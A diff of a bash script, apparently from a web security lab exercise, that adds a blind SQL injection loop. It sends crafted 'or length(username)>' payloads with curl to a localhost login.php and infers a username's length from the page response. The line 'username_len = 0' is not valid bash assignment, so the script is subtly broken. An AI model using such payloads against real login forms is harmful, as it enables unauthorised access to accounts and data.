@@ -1,16 +1,32 @@
 #!/bin/bash
 
-
-i=98
-
-
-for c in {33..126};
+username_len = 0
+for (( ; ;))
 do
-	x=$(printf '%x' $c)
-	echo "%$x"
-	char=$(echo $x | xxd -r -p)
-	echo "$char"
+	curl -s --data "u=\" or length(username)>\"$username_len\" -- " http://localhost/lab09/login.php > result.html
+
+	file=$(<result.html)
+	substring="magicworld.gif"
+
+	if [[ $file =~ $substring ]];
+	then
+		((username_len--))
+		echo "$username_len"
+		break	
+	fi
+	((username_len++))
 done
+
+# i=98
+
+
+# for c in {33..126};
+# do
+# 	x=$(printf '%x' $c)
+# 	echo "%$x"
+# 	char=$(echo $x | xxd -r -p)
+# 	echo "$char"
+# done
 
 
 # while true; do
